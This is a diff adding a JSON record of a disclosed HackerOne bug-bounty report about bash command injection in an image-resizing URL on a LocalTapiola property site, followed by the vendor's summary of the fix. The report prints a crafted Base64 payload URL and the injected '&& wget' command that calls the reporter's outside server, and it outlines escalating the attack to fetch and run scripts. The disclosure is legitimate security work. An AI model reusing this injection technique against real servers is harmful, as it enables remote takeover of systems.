@@ -1,0 +1,153 @@
+{
+  "id": 303061,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDMwNjE=",
+  "url": "https://hackerone.com/reports/303061",
+  "title": "RCE using bash command injection on /system/images (toimitilat.lahitapiola.fi)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-07T17:29:46.126Z",
+  "submitted_at": "2018-01-07T17:29:46.126Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yonm13",
+    "url": "/yonm13",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8416,
+    "url": "https://hackerone.com/localtapiola",
+    "handle": "localtapiola",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "LocalTapiola",
+      "twitter_handle": "",
+      "website": "http://www.lahitapiola.fi",
+      "about": "LocalTapiola’s products and services cover non-life, life and pension insurance, as well as investment and saving services."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-02-27T11:29:45.636Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-02-27T11:29:45.523Z",
+  "team_member_agreed_on_going_public_at": "2018-02-27T04:31:18.717Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:** \nthe \"/system/images\" URL accepts a Base-64 encoded string, which is in turn used to convert images from the local disk before displaying them to the user. The website fails to validate the user input, allowing arbitrary bash command injection.\n\n**Description:** \nWhen surfing the toimitilat.lahitapiola.fi domain, an attacker may encounter URLs like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJIMj█████████ZW5rYXR1XzFfanVsa2lzaXZ1M19MVF93LmpwZwY6BkVUWwk6B████ZlcnRJIiktc3RyaXAgLWludGVybGFjZSBQbGFuZSAtcXVhbGl0eSA4MCUGOwZU███TAyeAY7BlQ/00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg```\n\nThe latter part is unnecessary, and the Base64 encoded string resolves to (with some non displayable characters).\n```\u0004\b[\b[\u0007:\u0006fI\"H2017/12/01/08_34_36_493_00100_Kaisaniemenkatu_1_julkisivu3_LT_w.jpg\u0006:\u0006ET[\t:\u0006p:\fconvertI\")-strip -interlace Plane -quality 80%\u0006;\u0006T0[\b;\u0007:\nthumbI\"\t102x\u0006;```.\n\nThe 36 characters from after ' convertI\") ' until after the '80%' can be manipulated as the attacker wishes (padded by spaces to be exactly 36 characters), used to change the parameters injected to \"convert\" (by imagemagick, a library with multiple known vulnerabilities), and even inject arbitrary bash commands. e.g.\n```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl████████aXNpdnVfbHQuanBnB████████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y█████████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA ```\n\n(Injected command ``` && wget http://████████/d.html```).\nThis results in a 500 Error, as the server cannot return the image, but the action is performed as can be seen by attached PoC picture.\n\nThe 36 character limit poses limits on the attacker being able to exfiltrate data, which can probably be bypassed by creating a short runnable script in the running directory, (or downloading it from the internet using wget), then running it. I had started working towards a larger PoC (such as the /etc/passwd contents or equal), but have run out of time for today, hence reporting this with the \"wget\" PoC as this is quite a critical vulnerability, and it shouldn't wait until tomorrow. (This is an acceptable PoC for Remote Code Execution, as seen on HackerOne)\n\nPlease, feel free to ask additional questions, or consult about possible solutions.\n\n**Domain:** \ntoimitilat.lahitapiola.fi\n\n## Browsers / Apps Verified In:\nN/A\n\n## Steps To Reproduce:\n\n(Add details for how we can reproduce the issue)\n\n  1. Issue a request like ```https://toimitilat.lahitapiola.fi/system/images/BAhbCFsHOgZmSSJEMjAxNy8xMi8xNC8xNl███aXNpdnVfbHQuanBnB███████GcDoMY29udmVydEkiKSAmJiB3Z2V0IGh0dHA6Ly8y██████jkuMjU1L2QuaHRtbAY7BlQwWwg7BzoKdGh1bWJJIgkxMDB4AAAAAAAAAAAA```\nreplacing my server's IP with an internet facing server under your control.\n  2. See the issued request.\n\n## Additional material\n\n  * Screenshots: \n1.\"Empty WGET\". - A simple, empty WGET request to my server.\n2.\"d.html\" WGET - A WGET request to my server, downloading a file named d.html successfuly\n3. Working folder disclosure through \"comment\" flag injection\n\n## Related reports, best practices\nhttps://www.cvedetails.com/vulnerability-list/vendor_id-1749/Imagemagick.html\nhttps://www.owasp.org/index.php/OS_Command_Injection_Defense_Cheat_Sheet\nhttps://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet\n\n## Impact\n\nThis can lead to the attacker controlling the Tapiola server, altering its contents, using it as part of a botnet etc.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 209,
+  "voters": [
+    "flamezzz",
+    "lexx",
+    "irvinlim",
+    "jokebookservice1",
+    "n1m0",
+    "putsi",
+    "jr0ch17",
+    "sp1d3rs",
+    "cdl",
+    "europa",
+    "and 199 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.4,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1053,
+    "asset_type": "URL",
+    "asset_identifier": "toimitilat.lahitapiola.fi",
+    "max_severity": "none"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 6682,
+      "category": "team",
+      "content": "##Issue\n\nThe reporter found an intricate way of performing an RCE against the server.  The issue arose from a design where the service is using a command line tool to dynamically resize images on the fly. The reporter managed to find a weakness in the way the process was implemented. An attack against this flaw would have lead to a total compromise of the server. \n\n##Fix\nUsing and calling command line tools - as pointed out by the reporter many times - is considered very bad practice. Controlling and sanitizing input to a level that is truly secure is almost impossible. On the other hand, fixing an issue like this is not straightforward due to the fact that the implementation not just contains a technical flaw it also more or less contains an architectural and principal flaw. The reporter assisted in testing the fix which in the end lead to an acceptable although not perfect result.\n\n\n##Reasoning\n\nThe reported case was valid and within the scope of the bug bounty program. Although this service is a part of the LahiTapiola bug bounty program, it is actually a shared platform operated by a third party. LahiTapiola is just one of many corporate users. Fixing the issue was in part coordinated by LahiTapiola to ensure that the width and the breadth of the issue was understood by all affected and involved parties, and that no details were leaked ahead of time as not to put anyone at risk. \n\nThe service does not contain any LahiTapiola customer information nor is it part of the core systems at LahiTapiola. Even if fully owned, the server would not pose a direct threat to other LahiTapiola services - any pivoting to the core internal networks would not have been possible. From a bounty point of view, LahiTapiola always assesses reports from a business perspective.\n\nThe issue is fixed, although not perfectly in any way. Further reports on this matter must provide more actual proof than just repeating the conclusions of this report to be eligible for processing. For any developer reading this report, this can be considered a true learning opportunity.\n\nLahiTapiola wishes to thank the reporter for a valid and valuable report and for patience and assistance during the process of fixing.",
+      "user": {
+        "id": 60017,
+        "username": "localtapiola-thomas",
+        "name": "localtapiola-thomas",
+        "bio": "LocalTapiola Bug Bounty Coordinator - @tsmalmbe",
+        "cleared": false,
+        "verified": false,
+        "website": "http://www.lahitapiola.fi",
+        "location": "Espoo, Finland",
+        "created_at": "2016-03-09T13:58:17.117Z",
+        "url": "https://hackerone.com/localtapiola-thomas",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
